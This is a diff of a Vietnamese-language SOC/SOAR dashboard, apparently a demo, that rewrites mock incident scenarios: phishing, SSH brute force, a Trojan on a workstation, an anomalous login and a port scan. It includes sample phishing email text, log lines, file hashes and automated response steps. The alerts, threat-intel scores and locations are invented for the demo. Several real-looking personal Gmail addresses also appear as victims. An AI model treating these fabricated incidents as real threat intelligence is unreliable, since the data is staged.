-        <!-- THẨM ĐỊNH CỦA CHUYÊN VIÊN SOC -->
-        <div class="p-4 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-300 dark:border-slate-800 shadow-sm">
-          <h4 class="font-bold text-slate-800 dark:text-slate-200 mb-2 flex items-center gap-1.5 text-xs">
-            <i data-lucide="user-check" class="w-4 h-4 text-indigo-500"></i>
-            Thẩm Định Của Chuyên Viên SOC (Analyst Verdict)
-          </h4>
-          <div class="grid grid-cols-3 gap-2.5 mb-3">
-            <button class="p-2.5 rounded-xl border border-rose-500/40 bg-rose-500/10 text-rose-700 dark:text-rose-300 font-bold flex items-center justify-center gap-1.5 hover:bg-rose-500/20 cursor-pointer">
-              <i data-lucide="check" class="w-3.5 h-3.5"></i> True Positive (Tấn công thật)
-            </button>
-            <button class="p-2.5 rounded-xl border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-[#070b14] text-slate-600 dark:text-slate-400 font-semibold flex items-center justify-center gap-1.5 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer">
-              False Positive (Báo động giả)
-            </button>
-            <button class="p-2.5 rounded-xl border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-[#070b14] text-slate-600 dark:text-slate-400 font-semibold flex items-center justify-center gap-1.5 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer">
-              Security Drill (Diễn tập)
-            </button>
+        <!-- SOAR METRICS SUMMARY STRIP (CÂN BẰNG CHIỀU CAO TAB) -->
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+          <div class="p-3.5 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm flex items-center gap-3">
+            <div class="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 flex items-center justify-center shrink-0">
+              <i data-lucide="check-circle" class="w-4 h-4"></i>
+            </div>
+            <div>
+              <span class="text-[10px] text-slate-400 dark:text-slate-500 block font-medium">Trạng thái điều phối</span>
+              <span class="font-bold text-slate-800 dark:text-slate-200 text-xs">Thành công (100%)</span>
+            </div>
           </div>
-          <div>
-            <label class="text-slate-500 dark:text-slate-400 text-[11px] block mb-1 font-medium">Ghi chú điều tra vụ việc:</label>
-            <textarea placeholder="Nhập kết luận phân tích hoặc khuyến nghị vá lỗ hổng cho Dev team..." class="w-full p-2.5 rounded-xl bg-slate-50 dark:bg-[#070b14] border border-slate-300 dark:border-slate-800 text-slate-800 dark:text-slate-200 text-xs focus:border-cyan-500 outline-none h-16 resize-none"></textarea>
+          <div class="p-3.5 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm flex items-center gap-3">
+            <div class="w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 flex items-center justify-center shrink-0">
+              <i data-lucide="zap" class="w-4 h-4"></i>
+            </div>
+            <div>
+              <span class="text-[10px] text-slate-400 dark:text-slate-500 block font-medium">Tốc độ xử lý</span>
+              <span class="font-bold text-slate-800 dark:text-slate-200 text-xs">&lt; 2.5s (Tự động)</span>
+            </div>
+          </div>
+          <div class="p-3.5 rounded-xl bg-white dark:bg-[#0f172a] border border-slate-200 dark:border-slate-800/80 shadow-sm flex items-center gap-3">
+            <div class="w-8 h-8 rounded-lg bg-indigo-500/10 text-indigo-600 dark:text-indigo-400 flex items-center justify-center shrink-0">
+              <i data-lucide="shield-check" class="w-4 h-4"></i>
+            </div>
+            <div>
+              <span class="text-[10px] text-slate-400 dark:text-slate-500 block font-medium">Hạ tầng điều phối</span>
+              <span class="font-bold text-slate-800 dark:text-slate-200 text-xs">Docker & Webhook</span>
+            </div>
           </div>
         </div>
-
       </div>
 
     </div>
 
     <!-- 5. FOOTER BUTTONS -->
-    <div class="px-6 py-3.5 border-t border-slate-300 dark:border-slate-800 bg-slate-50/70 dark:bg-[#070b14]/50 flex items-center justify-between shrink-0">
-      <span class="text-[11px] text-slate-500 dark:text-slate-400">
-        Chuyên viên phụ trách: <span class="text-slate-800 dark:text-slate-200 font-bold">Admin SOC</span> (Tier 2 Lead)
+    <div class="px-6 py-3.5 border-t border-slate-200 dark:border-slate-800 bg-slate-50/70 dark:bg-[#070b14]/50 flex items-center justify-between shrink-0">
+      <span class="text-[11px] text-slate-500 dark:text-slate-400 flex items-center gap-1.5">
+        <span class="w-2 h-2 rounded-full bg-emerald-500 inline-block"></span>
+        Quy trình điều phối: <span class="text-slate-800 dark:text-slate-200 font-semibold">Tự động hóa hoàn tất (n8n SOAR)</span>
       </span>
       <div class="flex gap-2">
-        <button class="px-4 py-1.5 rounded-xl border border-slate-300 dark:border-slate-700 bg-white dark:bg-[#0f172a] hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-700 dark:text-slate-300 font-semibold transition cursor-pointer">
+        <button onclick="closeModal()" class="px-4 py-1.5 rounded-xl border border-slate-200 dark:border-slate-700/80 bg-white dark:bg-[#0c1222] hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-700 dark:text-slate-300 font-semibold transition cursor-pointer">
           Đóng
-        </button>
-        <button class="px-4 py-1.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold transition shadow-md shadow-cyan-600/20 cursor-pointer">
-          Lưu Thẩm Định & Gửi SOAR
         </button>
       </div>
     </div>
 
   </div>
 
-  <!-- DỮ LIỆU ĐẦY ĐỦ 10/10 KỊCH BẢN CHUẨN XÁC KHÔNG BỊ TRỐNG -->
+  <!-- TOAST NOTIFICATION -->
+  <div id="toastNotification" class="fixed bottom-6 right-6 px-4 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-white text-xs font-semibold shadow-2xl flex items-center gap-2 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none z-50">
+    <i id="toastIcon" data-lucide="check-circle" class="w-4 h-4 text-emerald-400"></i>
+    <span id="toastMessage">Thông báo</span>
+  </div>
+
+  <!-- DỮ LIỆU ĐẦY ĐỦ 10/10 KỊCH BẢN CHUẨN XÁC THEO N8N & BACKEND -->
   <script>
     const SCENARIOS = [
-      // 0. Phishing Email
+      // 0. Phishing Email (Duy nhất dùng VirusTotal API v3)
       {
-        title: "Phishing Email Detection",
+        playbook: "Playbook #1",
+        title: "Phishing Email",
+        subTitle: "Cảnh báo Email lừa đảo giả mạo tài khoản",
         severity: "HIGH",
-        severityColor: "orange",
-        mitreCode: "MITRE T1566.002",
         icon: "mail",
         incidentId: "f29a9c34-3276-4f1a-8bb2-41255725da82",
         time: "10:15:30 - 29/09/2026",
-        source: "194.26.29.112 (Mail Relay)",
-        target: "victim_ceo@company.com",
+        source: "194.26.29.112 (Mail Server)",
+        target: "10.0.0.15 (dat.tanvo6767@gmail.com)",
+        victimEmail: "dat.tanvo6767@gmail.com",
         geo: "Amsterdam, Netherlands (Bulletproof Host)",
-        score: "14/72 Detections (VirusTotal)",
-        tiEngine: "VirusTotal URL & Domain Scanner",
+        score: "VirusTotal: 18/90 Engines Malicious",
+        tiEngine: "VirusTotal Reputation Scanner",
+        tiIcon: "shield-alert",
         tiVerdict: "MALICIOUS URL",
-        tiRatio: "14 / 72",
-        tiDesc: "Các engine nhận diện link chứa trang giả mạo O365",
-        tiCategory: "Phishing Landing Page / Credential Harvesting",
-        tiTarget: "http://secure-login-verify.com/token=xyz",
+        tiRatio: "18 / 90",
+        tiPercent: "20%",
+        tiDesc: "URL độc hại phát hiện mã độc Eicar Test File",
+        tiCategory: "Phishing / Credential Harvesting URL",
+        tiTarget: "http://www.eicar.org/download/eicar.com",
         geoAsn: "AS49505 (Hostkey B.V.)",
         geoConn: "Unsolicited Bulk Email (Spam/Phishing)",
-        geoAsset: "Microsoft 365 Exchange Gateway",
-        mitreTactic: "Initial Access (Truy cập ban đầu)",
-        mitreTech: "T1566.002 - Spearphishing Link",
-        mitreDet: "SPF/DKIM Fail & Phishing Domain Match",
-        forensicTitle: "Bằng Chứng Email & Đường Link Lừa Đảo Trích Xuất",
-        forensicDesc: "Phát hiện email giả mạo thông báo của IT Security yêu cầu đổi mật khẩu khẩn cấp.",
-        forensicBox: `From: "IT Helpdesk Security" &lt;support@security-update-verify.com&gt;<br>To: victim_ceo@company.com<br>Subject: [KHẨN CẤP] Xác thực tài khoản công ty trước 12:00<br>Extracted Link: <u>http://secure-login-verify.com/token=xyz</u><br>Attachment: None (Direct Phishing Link)`,
+        geoAsset: "Microsoft 365 Exchange Gateway (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Trích Xuất từ Payload mockGenerator",
+        forensicDesc: "Phát hiện email giả mạo người dùng nội bộ đính kèm đường link tải mã độc Eicar.",
+        forensicBox: `Title: Cảnh báo Email lừa đảo giả mạo tài khoản<br>Sender: attacker_482@ten-mien-doc-hai.com<br>Recipient: nhan_vien_kinh_doanh@company.com<br>Subject: KHẨN CẤP: Yêu cầu xác minh tài khoản ngân hàng<br>Suspicious URL: <u>http://www.eicar.org/download/eicar.com</u><br>Victim Email (Đích nhận thông báo): dat.tanvo6767@gmail.com`,
         rawJson: {
-          event: "Phishing_Email",
-          sender: "support@security-update-verify.com",
-          recipient: "victim_ceo@company.com",
-          subject: "[KHẨN CẤP] Xác thực tài khoản công ty",
-          phishing_url: "http://secure-login-verify.com/token=xyz",
-          spf_status: "Fail",
-          virustotal_positives: 14
+          _id: "66f9104b2a81230018a12001",
+          alert_id: "f29a9c34-3276-4f1a-8bb2-41255725da82",
+          type: "Phishing Email",
+          severity: "High",
+          source_ip: "194.26.29.112",
+          destination_ip: "10.0.0.15",
+          victim_email: "dat.tanvo6767@gmail.com",
+          payload: {
+            title: "Cảnh báo Email lừa đảo giả mạo tài khoản",
+            sender: "attacker_482@ten-mien-doc-hai.com",
+            recipient: "nhan_vien_kinh_doanh@company.com",
+            subject: "KHẨN CẤP: Yêu cầu xác minh tài khoản ngân hàng",
+            suspicious_url: "http://www.eicar.org/download/eicar.com",
+            description: "Phát hiện đường link chứa URL mã độc (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "10:15:30", title: "1. Webhook tiếp nhận cảnh báo Email", desc: "Nhận gói tin phân tích từ hệ thống Mail Gateway." },
-          { time: "10:15:32", title: "2. n8n gọi API VirusTotal quét URL", desc: "Phát hiện 14 engine xếp hạng độc hại (Phishing Domain)." },
-          { time: "10:15:35", title: "3. Tự động thu hồi thư khỏi hòm mail (Quarantine)", desc: "Xóa email lừa đảo khỏi inbox nạn nhân để ngăn click." },
-          { time: "10:15:36", title: "4. Lấy Template & Gửi Email cảnh báo nạn nhân", desc: "Gửi hướng dẫn an toàn thông tin tới hòm thư của CEO." }
+          { time: "10:15:30", title: "1. Webhook tiếp nhận cảnh báo Phishing", desc: "Nhận payload từ mockGenerator gửi vào trigger-phishing." },
+          { time: "10:15:32", title: "2. Trích xuất URL & Base64 Encode", desc: "Chuyển http://www.eicar.org/download/eicar.com thành chuỗi base64 vt_id." },
+          { time: "10:15:34", title: "3. Gọi API VirusTotal v3", desc: "Trả về 18/90 engines báo cáo mã độc (Malicious > 0)." },
+          { time: "10:15:36", title: "4. Xin mẫu Email Backend & Gửi Gmail cảnh báo", desc: "Gửi cảnh báo đến dat.tanvo6767@gmail.com và cập nhật status #soar-done." }
         ]
       },
 
       // 1. Brute Force Attack
       {
-        title: "Brute Force Attack (SSH/Portal)",
+        playbook: "Playbook #2",
+        title: "Brute Force Attack",
+        subTitle: "Cảnh báo Tấn công dò mật khẩu (Brute Force)",
         severity: "HIGH",
-        severityColor: "orange",
-        mitreCode: "MITRE T1110.001",
         icon: "key",
         incidentId: "fb8a3b4a-9921-4d1a-8bb2-56123491ea11",
         time: "10:42:12 - 29/09/2026",
         source: "185.220.101.5 (Tor Exit)",
-        target: "10.0.0.15 (SSH Port 22)",
+        target: "10.0.0.15 (Port 22 SSH)",
+        victimEmail: "isseidat159@gmail.com",
         geo: "Frankfurt, Germany (Tor Network)",
-        score: "100% Malicious (AbuseIPDB)",
-        tiEngine: "AbuseIPDB IP Reputation",
-        tiVerdict: "BRUTE FORCE BOTNET",
-        tiRatio: "5,420 Reports",
-        tiDesc: "IP liên tục bị báo cáo vì hành vi quét cổng và dò SSH",
-        tiCategory: "Brute Force Bot / Automated Scanner",
-        tiTarget: "185.220.101.5",
+        score: "Ngưỡng giám sát: 11 Lần Thất Bại (> 10)",
+        tiEngine: "Giám Sát Ngưỡng SSH (Threshold Monitor)",
+        tiIcon: "shield-alert",
+        tiVerdict: "BRUTE FORCE DETECTED",
+        tiRatio: "11 / 10 Threshold",
+        tiPercent: "100%",
+        tiDesc: "Vượt ngưỡng tối đa cho phép (11 lần thất bại)",
+        tiCategory: "Automated Password Guessing / SSH Spray",
+        tiTarget: "SSH Port 22 (User: admin)",
         geoAsn: "AS200651 (Tor Relay Node)",
         geoConn: "Anonymized Onion Proxy",
-        geoAsset: "Linux Bastion Host (Port 22 SSH)",
-        mitreTactic: "Credential Access (Đánh cắp thông tin)",
-        mitreTech: "T1110.001 - Password Guessing",
-        mitreDet: "Failed Logins Exceeded (120 attempts / 2 min)",
-        forensicTitle: "Nhật Ký Đăng Nhập Thất Bại Liên Tục",
-        forensicDesc: "Phát hiện bot tự động dò mật khẩu vào các tài khoản mặc định và quản trị viên.",
-        forensicBox: `Failed password for invalid user admin from 185.220.101.5 port 48212 ssh2<br>Failed password for invalid user root from 185.220.101.5 port 48214 ssh2<br>Failed password for invalid user deploy from 185.220.101.5 port 48216 ssh2<br>Tool Fingerprint: Hydra v9.2 Multi-threaded Attacker`,
+        geoAsset: "Linux Bastion Host (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Đăng Nhập Thất Bại Vượt Ngưỡng (mockGenerator)",
+        forensicDesc: "Kẻ tấn công dò mật khẩu tài khoản admin trên dịch vụ SSH cổng 22 với 11 lần thất bại.",
+        forensicBox: `Title: Cảnh báo Tấn công dò mật khẩu (Brute Force)<br>Protocol: SSH | Port: 22<br>Target Username: admin<br>Failed Attempts: 11 (Vượt ngưỡng an toàn 10 lần)<br>Description: Đăng nhập sai quá 10 lần (True Positive).`,
         rawJson: {
-          event: "Brute_Force_Attack",
-          protocol: "SSH",
-          attacker_ip: "185.220.101.5",
-          failed_attempts: 120,
-          time_window: "120s",
-          targeted_accounts: ["admin", "root", "deploy", "ubuntu"]
+          _id: "66f9104b2a81230018a12002",
+          alert_id: "fb8a3b4a-9921-4d1a-8bb2-56123491ea11",
+          type: "Brute Force Attack",
+          severity: "High",
+          source_ip: "185.220.101.5",
+          destination_ip: "10.0.0.15",
+          victim_email: "isseidat159@gmail.com",
+          payload: {
+            title: "Cảnh báo Tấn công dò mật khẩu (Brute Force)",
+            username: "admin",
+            failed_attempts: 11,
+            protocol: "SSH",
+            port: 22,
+            description: "Đăng nhập sai quá 10 lần (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "10:42:12", title: "1. Phát hiện vượt ngưỡng 50 lần thử sai", desc: "Hệ thống bảo vệ SSH kích hoạt cảnh báo." },
-          { time: "10:42:14", title: "2. Tra cứu IP trên AbuseIPDB", desc: "Xác nhận IP có 5,420 báo cáo vi phạm trong tuần qua." },
-          { time: "10:42:16", title: "3. Tự động thêm rule IPTables chặn IP", desc: "Đã drop toàn bộ gói tin từ 185.220.101.5 trong 24 giờ." },
-          { time: "10:42:17", title: "4. Gửi thông báo khẩn qua Telegram/Slack", desc: "Đội ngũ SOC nhận thông báo IP đã bị cô lập." }
+          { time: "10:42:12", title: "1. Webhook nhận sự cố Brute Force", desc: "Trigger nhận dữ liệu từ mockGenerator với failed_attempts = 11." },
+          { time: "10:42:14", title: "2. n8n kiểm tra IF failed_attempts > 10", desc: "Điều kiện thỏa mãn (11 > 10). Phân loại True Positive." },
+          { time: "10:42:16", title: "3. Tự động thêm rule IPTables chặn IP", desc: "Thực thi cách ly IP 185.220.101.5 trong 24 giờ." },
+          { time: "10:42:17", title: "4. Gửi email cảnh báo quản trị viên & Đóng sự cố", desc: "Gửi báo cáo đến isseidat159@gmail.com và gắn tag #soar-done." }
         ]
       },
 
       // 2. Malware Detection
       {
-        title: "Malware Detection (Trojan/EDR)",
+        playbook: "Playbook #3",
+        title: "Malware Detection",
+        subTitle: "Cảnh báo Phát hiện Mã độc trên máy trạm",
         severity: "CRITICAL",
-        severityColor: "red",
-        mitreCode: "MITRE T1204.002",
         icon: "bug",
         incidentId: "aa1909fe-2314-4c12-9ab1-90123847fa21",
         time: "11:02:18 - 29/09/2026",
-        source: "10.0.4.88 (Finance-PC-04)",
-        target: "C:\\Windows\\Temp\\invoice.exe",
-        geo: "Nội bộ (Phòng Kế Toán)",
-        score: "58/72 Engines (VirusTotal)",
-        tiEngine: "VirusTotal Hash Analyzer",
-        tiVerdict: "TROJAN / RANSOMWARE",
-        tiRatio: "58 / 72",
-        tiDesc: "Tập tin bị gắn cờ là mã độc đào trộm tiền ảo và tống tiền",
-        tiCategory: "Trojan.Win32.Generic / CryptoMiner",
-        tiTarget: "SHA256: e3b0c44298fc1c149afbf4c8996fb92427...",
-        geoAsn: "Mạng LAN Nội Bộ (VLAN 40 - Finance)",
-        geoConn: "Endpoint Máy Trạm Windows 11",
-        geoAsset: "Máy tính kế toán viên: Nguyen Van A",
-        mitreTactic: "Execution (Thực thi mã độc)",
-        mitreTech: "T1204.002 - Malicious File",
-        mitreDet: "EDR Behavioral Alert: Process Injection",
-        forensicTitle: "Bằng Chứng Tập Tin & Mã Băm SHA-256",
-        forensicDesc: "Phần mềm EDR chặn đứng hành vi chèn luồng độc hại vào tiến trình hệ thống svchost.exe.",
-        forensicBox: `File Path: C:\\Users\\Administrator\\Downloads\\Invoice_Sept.pdf.exe<br>File Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855<br>Injected Target: C:\\Windows\\System32\\svchost.exe (PID: 4920)<br>Command: invoice.exe --silent --inject`,
+        source: "MAY-TRAM-KE-TOAN-42",
+        target: "10.0.0.15 (wibuuwu159@gmail.com)",
+        victimEmail: "wibuuwu159@gmail.com",
+        geo: "Nội bộ VLAN 40 (Máy trạm kế toán)",
+        score: "EDR Signature: Trojan.Win32",
+        tiEngine: "EDR Signature & Behavior Engine",
+        tiIcon: "cpu",
+        tiVerdict: "TROJAN DETECTED",
+        tiRatio: "Trojan.Win32",
+        tiPercent: "100%",
+        tiDesc: "Phần mềm chứa Trojan độc hại được EDR xác thực",
+        tiCategory: "Malicious Executable / Trojan Host",
+        tiTarget: "SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        geoAsn: "Mạng LAN Doanh Nghiệp (Internal Intranet)",
+        geoConn: "Workstation Host Client",
+        geoAsset: "Host: MAY-TRAM-KE-TOAN-42 (Kế toán)",
+        forensicTitle: "Bằng Chứng Mã Độc Trích Xuất (mockGenerator)",
+        forensicDesc: "Phát hiện tệp tin thực thi chứa Trojan.Win32 trên máy trạm kế toán.",
+        forensicBox: `Hostname: MAY-TRAM-KE-TOAN-42<br>File Name: chi_tiet_hoa_don_thanh_toan.exe<br>File Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855<br>Threat Name: Trojan.Win32<br>Description: Phần mềm chứa Trojan độc hại (True Positive).`,
         rawJson: {
-          event: "Malware_Detection",
-          hostname: "FINANCE-PC-04",
-          file_name: "Invoice_Sept.pdf.exe",
-          sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-          detection_name: "Trojan.Generic.KD.8912",
-          edr_status: "Quarantined"
+          _id: "66f9104b2a81230018a12003",
+          alert_id: "aa1909fe-2314-4c12-9ab1-90123847fa21",
+          type: "Malware Detection",
+          severity: "Critical",
+          source_ip: "10.0.4.88",
+          destination_ip: "10.0.0.15",
+          victim_email: "wibuuwu159@gmail.com",
+          payload: {
+            title: "Cảnh báo Phát hiện Mã độc trên máy trạm",
+            hostname: "MAY-TRAM-KE-TOAN-42",
+            file_name: "chi_tiet_hoa_don_thanh_toan.exe",
+            file_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            threat_name: "Trojan.Win32",
+            description: "Phần mềm chứa Trojan độc hại (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:02:18", title: "1. EDR kích hoạt cảnh báo chặn file", desc: "Tập tin Invoice_Sept.pdf.exe bị khóa ngay khi chạy." },
-          { time: "11:02:20", title: "2. n8n đối soát Hash trên VirusTotal", desc: "Xác nhận 58 hãng bảo mật cảnh báo mã độc Trojan." },
-          { time: "11:02:22", title: "3. Kích hoạt cô lập máy tính khỏi mạng (Host Isolation)", desc: "Máy FINANCE-PC-04 bị ngắt mạng LAN để chống lây lan." },
-          { time: "11:02:24", title: "4. Gửi email thông báo cho IT Support", desc: "Kỹ thuật viên đến trực tiếp thu hồi máy tính xử lý." }
+          { time: "11:02:18", title: "1. Webhook nhận cảnh báo Malware", desc: "EDR phát hiện file chi_tiet_hoa_don_thanh_toan.exe chứa Trojan.Win32." },
+          { time: "11:02:20", title: "2. n8n kiểm tra IF threat_name == 'Trojan.Win32'", desc: "Xác thực mẫu mã độc mức độ Critical." },
+          { time: "11:02:22", title: "3. Tự động cô lập máy tính (Host Isolation)", desc: "Ngắt kết nối mạng của máy MAY-TRAM-KE-TOAN-42." },
+          { time: "11:02:24", title: "4. Gửi email thông báo kỹ thuật viên IT & Đóng sự cố", desc: "Gửi báo cáo xử lý đến wibuuwu159@gmail.com." }
         ]
       },
 
       // 3. Suspicious Login
       {
-        title: "Suspicious Login (Impossible Travel)",
-        severity: "MEDIUM",
-        severityColor: "amber",
-        mitreCode: "MITRE T1078.004",
+        playbook: "Playbook #4",
+        title: "Suspicious Login",
+        subTitle: "Cảnh báo Đăng nhập bất thường (Vị trí lạ)",
+        severity: "HIGH",
         icon: "user-x",
         incidentId: "44be8812-7711-4f90-bc12-66129841ca90",
         time: "11:15:00 - 29/09/2026",
-        source: "103.152.220.45 (Lagos, Nigeria)",
-        target: "user_account: ketoan_truong@company.com",
-        geo: "Lagos, Nigeria (Chênh lệch 8,000 km)",
-        score: "VPN/Proxy Match (MaxMind)",
-        tiEngine: "GeoIP & Threat Intelligence",
-        tiVerdict: "IMPOSSIBLE TRAVEL",
-        tiRatio: "Tốc độ: 8,000 km/h",
-        tiDesc: "Vừa đăng nhập tại Hà Nội 45 phút trước, nay xuất hiện tại Nigeria",
-        tiCategory: "Credential Leak / Stolen Session Cookie",
-        tiTarget: "103.152.220.45",
-        geoAsn: "AS37148 (Spectranet Limited)",
-        geoConn: "Mobile Broadband / Datacenter Proxy",
-        geoAsset: "Cổng Portal Quản Trị ERP",
-        mitreTactic: "Defense Evasion (Trốn tránh giám sát)",
-        mitreTech: "T1078.004 - Cloud Accounts",
-        mitreDet: "Anomaly Rule: Geo-velocity Exceeded",
-        forensicTitle: "Bằng Chứng Xung Đột Vị Trí Đăng Nhập",
-        forensicDesc: "Khoảng cách địa lý không tưởng trong khoảng thời gian ngắn cho thấy cookie phiên đã bị đánh cắp.",
-        forensicBox: `Session 1: 10:30:00 - IP 14.162.11.2 (Hanoi, Vietnam) - Chrome Windows<br>Session 2: 11:15:00 - IP 103.152.220.45 (Lagos, Nigeria) - Python Script<br>Distance: 8,450 km - Velocity required: 11,266 km/h (Anomaly Detected)`,
+        source: "103.152.220.45 (HackerLand)",
+        target: "10.0.0.15 (nguyen.van.a@company.com)",
+        victimEmail: "alvaroll18cau@gmail.com",
+        geo: "HackerLand (Lệch so với Hanoi)",
+        score: "Vị trí lạ: HackerLand vs Hanoi (Delta 0.5h)",
+        tiEngine: "Geo-Velocity Anomaly Engine",
+        tiIcon: "compass",
+        tiVerdict: "ANOMALOUS LOCATION",
+        tiRatio: "HackerLand",
+        tiPercent: "95%",
+        tiDesc: "Vị trí đăng nhập rất bất thường (True Positive)",
+        tiCategory: "Credential Leak / Stolen Session",
+        tiTarget: "nguyen.van.a@company.com",
+        geoAsn: "AS37148 (International Proxy)",
+        geoConn: "Datacenter Proxy / Anonymous VPN",
+        geoAsset: "Cổng Portal Quản Trị ERP (10.0.0.15)",
+        forensicTitle: "Bằng Chứng Xung Đột Vị Trí Địa Lý (mockGenerator)",
+        forensicDesc: "Người dùng nguyen.van.a@company.com vừa đăng nhập tại Hanoi, 30 phút sau đăng nhập tại HackerLand.",
+        forensicBox: `User Email: nguyen.van.a@company.com<br>Current Location: HackerLand<br>Usual Location: Hanoi<br>Time Difference: 0.5 hours<br>Description: Vị trí đăng nhập rất bất thường (True Positive).`,
         rawJson: {
-          event: "Suspicious_Login",
-          user: "ketoan_truong@company.com",
-          first_login: { time: "10:30", ip: "14.162.11.2", location: "Hanoi, VN" },
-          second_login: { time: "11:15", ip: "103.152.220.45", location: "Lagos, NG" },
-          verdict: "Impossible Travel"
+          _id: "66f9104b2a81230018a12004",
+          alert_id: "44be8812-7711-4f90-bc12-66129841ca90",
+          type: "Suspicious Login",
+          severity: "High",
+          source_ip: "103.152.220.45",
+          destination_ip: "10.0.0.15",
+          victim_email: "alvaroll18cau@gmail.com",
+          payload: {
+            title: "Cảnh báo Đăng nhập bất thường (Vị trí lạ)",
+            user_email: "nguyen.van.a@company.com",
+            location: "HackerLand",
+            usual_location: "Hanoi",
+            time_difference_hours: 0.5,
+            description: "Vị trí đăng nhập rất bất thường (True Positive)."
+          },
+          status: "Resolved",
+          tags: ["soar-done"]
         },
         steps: [
-          { time: "11:15:00", title: "1. Phát hiện phiên đăng nhập bất thường", desc: "Hệ thống Identity ghi nhận đăng nhập từ IP lạ." },
-          { time: "11:15:02", title: "2. Tự động thu hồi token (Revoke Session)", desc: "Ngắt kết nối lập tức cả 2 phiên đăng nhập." },
-          { time: "11:15:04", title: "3. Bật cờ bắt buộc đặt lại mật khẩu (Force Reset)", desc: "Khóa quyền truy cập cho tới khi chủ tài khoản xác nhận qua SMS." }
+          { time: "11:15:00", title: "1. Webhook nhận cảnh báo Suspicious Login", desc: "Identity Gateway phát hiện phiên đăng nhập tại HackerLand." },
+          { time: "11:15:02", title: "2. n8n so sánh location != usual_location", desc: "Xác thực chênh lệch: 'HackerLand' khác 'Hanoi' trong vòng 0.5 giờ." },
+          { time: "11:15:04", title: "3. Tự động thu hồi Refresh Token của phiên", desc: "Đăng xuất tài khoản nguyen.van.a@company.com khỏi tất cả phiên làm việc." },
+          { time: "11:15:05", title: "4. Gửi email yêu cầu xác thực OTP & Đóng sự cố", desc: "Gửi email cảnh báo tới alvaroll18cau@gmail.com." }
         ]
       },
 
-      // 4. Port Scan Detection
+      // 4. Port Scan Detection (Có AbuseIPDB)
       {
-        title: "Port Scan Detection (Reconnaissance)",
-        severity: "LOW",
-        severityColor: "blue",
-        mitreCode: "MITRE T1046",
+        playbook: "Playbook #5",
+        title: "Port Scan Detection",
+        subTitle: "Cảnh báo Rà quét cổng mạng nội bộ",
+        severity: "MEDIUM",
         icon: "radar",
         incidentId: "11a98231-6655-4b11-9988-123456789abc",
         time: "11:20:10 - 29/09/2026",
-        source: "45.146.164.110 (Scanner)",
-        target: "10.0.0.1 (DMZ Firewall)",
-        geo: "Moscow, Russia (Bulletproof)",
-        score: "Greynoise: Malicious Scanner",
-        tiEngine: "GreyNoise & Shodan Intelligence",
-        tiVerdict: "INTERNET SCANNER",
-        tiRatio: "12,000 Scans/Day",
-        tiDesc: "IP chuyên rà quét hàng loạt hạ tầng máy chủ toàn cầu",
-        tiCategory: "Reconnaissance / Masscan Scanner",
-        tiTarget: "45.146.164.110",
-        geoAsn: "AS44050 (Petersburg Internet Network)",
-        geoConn: "Hosting / Dedicated Server",
-        geoAsset: "Tường lửa phân vùng biên (Edge Gateway)",
-        mitreTactic: "Discovery (Thăm dò hạ tầng)",
-        mitreTech: "T1046 - Network Service Discovery",
-        mitreDet: "SYN Flood Threshold (1,000 ports / 10s)",
-        forensicTitle: "Bằng Chứng Rà Quét Hàng Loạt Cổng Mạng",
-        forensicDesc: "Hacker thăm dò các cổng dịch vụ phổ biến để tìm kiếm cơ sở dữ liệu mở hoặc cổng SSH yếu.",
-        forensicBox: `Target Ports Scanned: 21 (FTP), 22 (SSH), 23 (Telnet), 80 (HTTP), 443 (HTTPS), 1433 (MSSQL), 3306 (MySQL), 27017 (MongoDB)<br>Scan Technique: TCP SYN Stealth (Half-open Scan)<br>Rate: 850 packets per second`,
+        source: "103.11.22.33 (Nmap Scanner)",
+        target: "10.0.0.15 (DMZ Gateway)",
+        victimEmail: "dae1924mike@gmail.com",
+        geo: "Hà Nội, Vietnam (Bulletproof Host)",
+        score: "AbuseIPDB Threat Score: 90/100",
+        tiEngine: "AbuseIPDB Threat Intelligence",
+        tiIcon: "shield-alert",
+        tiVerdict: "MALICIOUS IP",
+        tiRatio: "90 / 100",
+        tiPercent: "90%",
+        tiDesc: "IP độc hại rà quét cổng mạng nội bộ (True Positive)",
+        tiCategory: "Reconnaissance / Port Scanning",
+        tiTarget: "103.11.22.33",
+        geoAsn: "AS45899 (VNPT Corp)",
+        geoConn: "Dedicated Server / Hosting",
+        geoAsset: "Tường lửa phân vùng biên (DMZ Gateway - 10.0.0.15)",
+        forensicTitle: "Bằng Chứng Rà Quét Cổng Mạng (mockGenerator)",
+        forensicDesc: "Phát hiện công cụ Nmap quét 1500 gói tin vào các cổng 21, 22, 80, 443, 3306, 8080 từ IP 103.11.22.33.",
+        forensicBox: `Tool Used: Nmap Port Scanner<br>Source IP: 103.11.22.33<br>Scanned Ports: [21, 22, 80, 443, 3306, 8080]<br>Total Packets: 1500<br>Description: IP độc hại rà quét cổng (True Positive).`,
         rawJson: {
-          event: "Port_Scan_Detection",
